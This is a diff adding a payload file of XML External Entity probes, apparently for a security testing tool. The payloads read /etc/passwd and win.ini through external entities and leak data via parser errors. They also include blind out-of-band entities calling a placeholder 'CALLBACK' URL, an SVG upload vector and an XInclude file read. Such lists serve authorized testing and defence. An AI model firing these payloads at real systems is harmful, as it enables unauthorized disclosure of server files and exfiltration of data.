@@ -1,0 +1,15 @@
+# XXE probe payloads - one per section, # lines are comments.
+# Classic XXE: external entity on /etc/passwd (look for root:x:0:0)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+# Classic XXE on windows canary
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>
+# Error-based XXE: nonexistent file triggers parser error leak
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///arsenal-no-such-file-xyz">]><r>&xxe;</r>
+# Blind XXE: parameter entity to OOB callback (replace CALLBACK with your inbox URL)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "CALLBACK"> %a;]><r>1</r>
+# Blind XXE via external DTD
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "CALLBACK"> %dtd;]><r>1</r>
+# SVG-based XXE (upload vectors)
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>
+# XInclude probe
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>
